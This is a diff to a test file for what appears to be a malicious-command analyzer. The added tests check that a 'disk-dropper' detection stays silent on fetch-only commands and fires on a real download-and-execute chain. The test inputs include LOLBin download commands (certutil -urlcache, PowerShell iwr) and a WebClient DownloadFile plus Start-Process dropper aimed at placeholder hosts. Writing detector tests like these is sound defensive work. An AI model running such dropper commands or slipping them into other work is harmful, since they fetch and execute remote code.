@@ -556,3 +556,27 @@ describe('LOLBin narrative no-invent (review 2.3, sample 7)', () => {
     expect(r.bullets.some((b) => /squiblydoo/i.test(b.text))).toBe(true)
   })
 })
+
+describe('disk-dropper false-positive fixes (Task 13 review), verified end-to-end through the real analyze() pipeline', () => {
+  it('review fix (a): a fully-qualified fetch tool name sitting at corpus position 0 (certutil.exe / powershell.exe) does NOT fire disk-dropper on a pure fetch-to-disk with no execution', async () => {
+    const r1 = await analyze('certutil.exe -urlcache -split -f http://x.test/a.exe destination.exe')
+    expect(r1.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r1.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+
+    const r2 = await analyze('powershell.exe -Command "iwr http://e/a.exe -OutFile a.exe"')
+    expect(r2.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r2.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+  })
+
+  it('review fix (b): a benign fetch-to-disk whose corpus merely contains "ascii" (Out-File -Encoding ascii) does NOT fire disk-dropper', async () => {
+    const r = await analyze('certutil -urlcache -split -f http://x.test/a.exe a.exe; Out-File -Encoding ascii report.txt')
+    expect(r.signals.some((s) => s.id === 'disk-dropper')).toBe(false)
+    expect(r.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(false)
+  })
+
+  it('the genuine dropper still fires disk-dropper and its bullet end to end, post-fix', async () => {
+    const r = await analyze("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")
+    expect(r.signals.some((s) => s.id === 'disk-dropper')).toBe(true)
+    expect(r.bullets.some((b) => b.text === 'Downloads a file to disk and executes it')).toBe(true)
+  })
+})
